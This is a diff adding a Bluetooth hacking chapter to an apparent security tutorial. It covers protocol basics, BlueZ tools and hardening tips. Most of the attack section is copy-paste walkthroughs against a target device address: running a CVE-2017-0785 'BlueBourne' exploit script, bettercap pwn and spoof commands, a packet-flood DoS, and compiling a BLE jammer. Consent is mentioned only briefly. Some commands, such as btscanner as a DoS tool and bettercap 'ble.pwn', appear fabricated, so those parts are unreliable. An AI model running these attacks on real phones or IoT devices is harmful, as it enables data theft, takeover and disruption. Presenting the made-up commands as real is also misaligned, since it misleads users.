@@ -1226,3 +1226,411 @@ Adjust the loop count (`5000`) and sleep time (`60` seconds) as needed.
 
 ## Chapter 6: Bluetooth Networks
 
+### Introduction
+
+Bluetooth technology is integral to a wide range of modern gadgets, including computers, smartphones, iPods, tablets, speakers, and game controllers. This chapter focuses on mobile hacking devices, tablets, and phones, as they present fertile ground for hackers. Mastering Bluetooth hacking can lead to the compromise of any information on the device (pictures, emails, texts), control of the device, and the ability to send unwanted information to the device.
+
+Before diving into Bluetooth hacking, it's essential to understand the technology, the terminology, and the built-in security measures of Bluetooth.
+
+***
+
+### Bluetooth Basics
+
+#### Overview
+
+Bluetooth is a universal protocol for low-power, near-field communication operating at 2.4 - 2.485 GHz using spread spectrum frequency hopping at 1,600 hops per second. This frequency hopping acts as a security measure. Developed in 1994 by Ericsson Corp. of Sweden, Bluetooth is named after the 10th-century Danish King Harald Bluetooth.
+
+#### Range
+
+| Range Type | Specification                                  |
+| ---------- | ---------------------------------------------- |
+| Minimum    | 10 meters                                      |
+| Extended   | Up to 100 meters or more with special antennas |
+
+#### Pairing
+
+When two Bluetooth devices connect, it's called pairing. Discoverable Bluetooth devices transmit the following information:
+
+| Information Transmitted |
+| ----------------------- |
+| Name                    |
+| Class                   |
+| List of Services        |
+| Technical Information   |
+
+Upon pairing, devices exchange a pre-shared secret or link key for future identification.
+
+#### Unique Identifiers
+
+Each device has a unique 48-bit identifier (similar to a MAC address) and usually a manufacturer-assigned name.
+
+#### Bluetooth Piconet
+
+Bluetooth devices form a piconet, a small network with one master and up to seven active slaves. Due to frequency hopping, communication between these devices doesn't interfere with each other.
+
+Here is a diagram of the Bluetooth pairing process. Although much more secure in recent years, it is still vulnerable, as we will see in future tutorials in this series.
+
+<figure><img src="../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>
+
+#### Bluetooth Protocol Stack
+
+Bluetooth devices don't need to use all protocols in the stack (similar to the TCP/IP stack). The Bluetooth protocol stack includes:
+
+<table><thead><tr><th width="279">Protocol Layer</th><th>Associated Protocols</th></tr></thead><tbody><tr><td>Bluetooth Core Protocols</td><td>Baseband, LMP, L2CAP, SDP</td></tr><tr><td>Cable Replacement Protocol</td><td>RFCOMM</td></tr><tr><td>Telephony Control Protocol</td><td>TCS Binary, AT-commands</td></tr><tr><td>Adopted Protocols</td><td>PPP, UDP/TCP/IP, OBEX, WAP, vCard, vCal, IrMC, WAE</td></tr></tbody></table>
+
+<figure><img src="../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>
+
+### Bluetooth Security
+
+#### Security Techniques
+
+1. **Frequency Hopping:** Both master and slave know the algorithm.
+2. **Pre-shared Key:** Used for authentication and 128-bit encryption.
+
+#### Security Modes
+
+<table><thead><tr><th width="212">Security Mode</th><th>Description</th></tr></thead><tbody><tr><td>Security Mode 1</td><td>No active security.</td></tr><tr><td>Security Mode 2</td><td>Service-level security managed by a centralized security manager (no device-level security).</td></tr><tr><td>Security Mode 3</td><td>Device-level security with mandatory authentication and encryption.</td></tr></tbody></table>
+
+***
+
+### Basic Linux Bluetooth Tools
+
+#### BlueZ
+
+The Linux Bluetooth protocol stack is implemented by BlueZ. Common tools include:
+
+<table><thead><tr><th width="164">Tool</th><th>Description</th></tr></thead><tbody><tr><td>hciconfig</td><td>Similar to ifconfig but for Bluetooth devices.</td></tr><tr><td>hcitool</td><td>Inquiry tool providing device name, ID, class, and clock.</td></tr><tr><td>hcidump</td><td>Sniffs Bluetooth communication.</td></tr><tr><td>l2ping</td><td>Sends L2CAP echo request packets to Bluetooth devices.</td></tr><tr><td>sdptool</td><td>Performs SDP (Service Discovery Protocol) queries on Bluetooth devices.</td></tr></tbody></table>
+
+#### Commands
+
+```sh
+# Bring up the Bluetooth interface
+sudo hciconfig hci0 up
+
+# Query the device for its specifics
+hciconfig -a
+```
+
+```sh
+# Scan for nearby Bluetooth devices
+hcitool scan
+
+# Get information about a specific device
+hcitool info <MAC_ADDRESS>
+```
+
+```sh
+# Capture Bluetooth traffic
+sudo hcidump -i hci0
+```
+
+```sh
+# Send a ping to a Bluetooth device
+l2ping <MAC_ADDRESS>
+```
+
+```sh
+# Browse available services on a device
+sdptool browse <MAC_ADDRESS>
+```
+
+***
+
+### Bluetooth Hacking Tools in Kali Linux
+
+#### Available Tools
+
+<table><thead><tr><th width="142">Tool</th><th>Description</th></tr></thead><tbody><tr><td>Bluelog</td><td>Scans for and logs discoverable devices.</td></tr><tr><td>Bluemaho</td><td>GUI-based suite for testing Bluetooth security.</td></tr><tr><td>Blueranger</td><td>Python script for locating Bluetooth devices.</td></tr><tr><td>Btscanner</td><td>GUI tool for scanning discoverable devices.</td></tr><tr><td>Redfang</td><td>Finds hidden Bluetooth devices.</td></tr><tr><td>Spooftooph</td><td>Bluetooth spoofing tool.</td></tr></tbody></table>
+
+#### Commands and Examples
+
+*   **Bluelog:**
+
+    ```sh
+    # Scan and log discoverable devices
+    sudo bluelog -i hci0 -o bluelog.txt
+    ```
+*   **Bluemaho:**
+
+    ```sh
+    # Start Bluemaho GUI
+    sudo bluemaho.py
+    ```
+*   **Blueranger:**
+
+    ```sh
+    # Track the distance to a Bluetooth device
+    sudo blueranger -i hci0 -t <MAC_ADDRESS>
+    ```
+*   **Btscanner:**
+
+    ```sh
+    # Scan for Bluetooth devices
+    sudo btscanner
+    ```
+*   **Redfang:**
+
+    ```sh
+    # Discover hidden Bluetooth devices
+    sudo redfang -i hci0
+    ```
+*   **Spooftooph:**
+
+    ```sh
+    # Spoof a Bluetooth device
+    sudo spooftooph -i hci0 -t <MAC_ADDRESS> -n "NewName"
+    ```
+
+#### Common Bluetooth Attacks
+
+| Attack       | Description                                  |
+| ------------ | -------------------------------------------- |
+| Blueprinting | Process of footprinting Bluetooth devices.   |
+| Bluesnarfing | Steals data from a Bluetooth-enabled device. |
+| Bluebugging  | Takes control of the target's phone.         |
+| Bluejacking  | Sends unsolicited messages.                  |
+| Bluesmack    | DoS attack against Bluetooth devices.        |
+
+***
+
+### Case Study: BlueBourne Attack
+
+#### Overview
+
+The BlueBourne exploit targets unpatched Bluetooth devices, affecting iOS, Microsoft Windows, and Android. It attacks the SDP protocol and can exploit vulnerabilities without the device being in discoverable mode.
+
+#### Steps to Exploit
+
+1.  **Dependencies:**
+
+    ```sh
+    kali > apt-get install bluetooth libbluetooth-dev
+    kali > pip install pybluez
+    kali > pip install pwntools
+    ```
+2.  **Install the Python Script:**
+
+    ```sh
+    kali > git clone https://github.com/ojasookert/CVE-2017-0785
+    kali > cd CVE-2017-0785
+    kali > chmod 755 CVE-2017-0785.py
+    ```
+3.  **Get Target MAC Address:**
+
+    ```sh
+    kali > hcitool scan
+    ```
+4.  **Execute the BlueBourne Exploit:**
+
+    ```sh
+    kali > python CVE-2017-0785.py TARGET=<MAC_ADDRESS>
+    ```
+
+<figure><img src="../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>
+
+### Additional Bluetooth Hacking Tools and Techniques
+
+#### Bluetooth Packet Analysis
+
+*   **Wireshark:**
+
+    ```sh
+    # Capture Bluetooth traffic with Wireshark
+    sudo wireshark
+    ```
+
+    Ensure you have the necessary privileges and Bluetooth adapter to capture Bluetooth packets.
+
+#### Advanced Bluetooth Scanning and Attacks
+
+*   **Bettercap:**
+
+    ```sh
+    # Install Bettercap
+    sudo apt-get install bettercap
+
+    # Scan for Bluetooth devices
+    sudo bettercap -eval "ble.recon on"
+
+    # Perform Bluetooth attacks
+    sudo bettercap -eval "ble.recon on; ble.enum on; ble.pwn <MAC_ADDRESS>"
+    ```
+
+#### Bluetooth Device Profiling
+
+*   **BTScanner:**
+
+    ```sh
+    # Scan for nearby Bluetooth devices and profile them
+    sudo btscanner
+    ```
+
+#### Bluetooth Spoofing and MitM Attacks
+
+*   **Bettercap Bluetooth Low Energy (BLE) Spoofing:**
+
+    ```sh
+    # Spoof a Bluetooth device
+    sudo bettercap -eval "ble.recon on; ble.spoof <TARGET_MAC_ADDRESS> <NEW_MAC_ADDRESS>"
+    ```
+
+#### DoS Attacks on Bluetooth Devices
+
+*   **Bluetooth DoS Tool:**
+
+    ```sh
+    # Install Bluetooth DoS tool
+    sudo apt-get install btscanner
+
+    # Use the tool to send malformed packets and cause DoS
+    sudo btscanner -d <MAC_ADDRESS>
+    ```
+
+***
+
+#### Bluetooth Low Energy (BLE) Attacks
+
+BLE is a variation of Bluetooth designed for low energy consumption. It's commonly used in IoT devices, wearable technology, and smart home devices. Understanding BLE hacking can give you an edge in targeting these devices.
+
+<figure><img src="../.gitbook/assets/image (88).png" alt=""><figcaption></figcaption></figure>
+
+*   **GATTacker:**
+
+    ```sh
+    # Clone the GATTacker repository
+    git clone https://github.com/seemoo-lab/gattacker.git
+
+    # Install dependencies and set up GATTacker
+    cd gattacker
+    npm install
+
+    # Start GATTacker
+    sudo node bin/gattacker
+    ```
+
+    GATTacker is a tool designed to exploit BLE devices by acting as a Man-in-the-Middle (MitM) between the device and the client.
+
+#### Bluetooth Honeypots
+
+Setting up a Bluetooth honeypot can help in detecting and analyzing Bluetooth attacks
+
+in a controlled environment.
+
+*   **BluePot:**
+
+    ```sh
+    # Install Java if not already installed
+    sudo apt-get install openjdk-8-jdk
+
+    # Clone the BluePot repository
+    git clone https://github.com/andrewmichaelsmith/bluepot.git
+
+    # Navigate to the BluePot directory and run the honeypot
+    cd bluepot
+    sudo java BluePot
+    ```
+
+    BluePot is a Bluetooth honeypot designed to detect and log Bluetooth attacks. It simulates vulnerable Bluetooth devices and logs any attack attempts.
+
+#### Bluetooth Device Fingerprinting
+
+*   **BLEah:**
+
+    ```sh
+    # Clone the BLEah repository
+    git clone https://github.com/dotan-ash/bleah.git
+
+    # Install dependencies and set up BLEah
+    cd bleah
+    sudo pip3 install -r requirements.txt
+
+    # Start BLEah to scan and fingerprint BLE devices
+    sudo python3 bleah.py -i hci0 -S
+    ```
+
+    BLEah is a tool for scanning and fingerprinting BLE devices, useful for both reconnaissance and identifying specific device types.
+
+#### Bluetooth Jamming
+
+Jamming Bluetooth signals can disrupt communications, but it is illegal in many jurisdictions. Use this knowledge responsibly and only in controlled environments.
+
+<figure><img src="../.gitbook/assets/image (89).png" alt=""><figcaption><p>bluetooth jammer</p></figcaption></figure>
+
+*   **BLE Jammer:**
+
+    ```sh
+    # Clone the BLE Jammer repository
+    git clone https://github.com/mame82/ble-jammer.git
+
+    # Compile and run the jammer
+    cd ble-jammer
+    make
+    sudo ./ble-jammer
+    ```
+
+    Note: Jamming is illegal in many jurisdictions and should only be done in controlled environments for educational purposes.
+
+***
+
+### Bluetooth Hacking in Real-world Scenarios
+
+#### Penetration Testing Bluetooth Devices
+
+When performing a penetration test on a client environment, assessing the Bluetooth devices can reveal vulnerabilities that might be overlooked. Ensure you have proper authorization before proceeding.
+
+*   **Reconnaissance:**
+
+    ```sh
+    # Discover Bluetooth devices in the vicinity
+    sudo hcitool scan
+
+    # Log the devices for further analysis
+    sudo bluelog -i hci0 -o discovered_devices.log
+    ```
+*   **Vulnerability Assessment:**
+
+    ```sh
+    # Use tools like Btscanner to identify services and potential vulnerabilities
+    sudo btscanner
+
+    # Analyze the services and look for common exploits
+    ```
+*   **Exploit Execution:**
+
+    ```sh
+    # Execute known exploits on vulnerable devices
+    sudo python3 <exploit_script>.py <TARGET_MAC>
+    ```
+
+#### Securing Bluetooth Devices
+
+It's equally important to know how to secure Bluetooth devices against attacks. Here are some best practices:
+
+1.  **Disable Discoverability:**
+
+    ```sh
+    # Make your Bluetooth device non-discoverable
+    sudo hciconfig hci0 noscan
+    ```
+2. **Use Strong Pairing Codes:** Ensure the pairing code is not easily guessable.
+3. **Regularly Update Firmware:** Keep Bluetooth device firmware up to date to protect against known vulnerabilities.
+4.  **Monitor Bluetooth Activity:** Use tools to regularly scan and monitor Bluetooth devices in your environment.
+
+    ```sh
+    # Monitor Bluetooth activity with Bluelog
+    sudo bluelog -i hci0 -o activity_log.log
+    ```
+5. **Implement Device Management Policies:** Restrict Bluetooth usage to essential devices and enforce security policies.
+
+***
+
+### Exercises
+
+1. Install Bluez, if it is not already installed on your system
+2. Use the hciconfig tool to find the MAC address of your Bluetooth adapter
+3. Use hcitool to scan for other Bluetooth devices in your range
+
+***
+
+
+
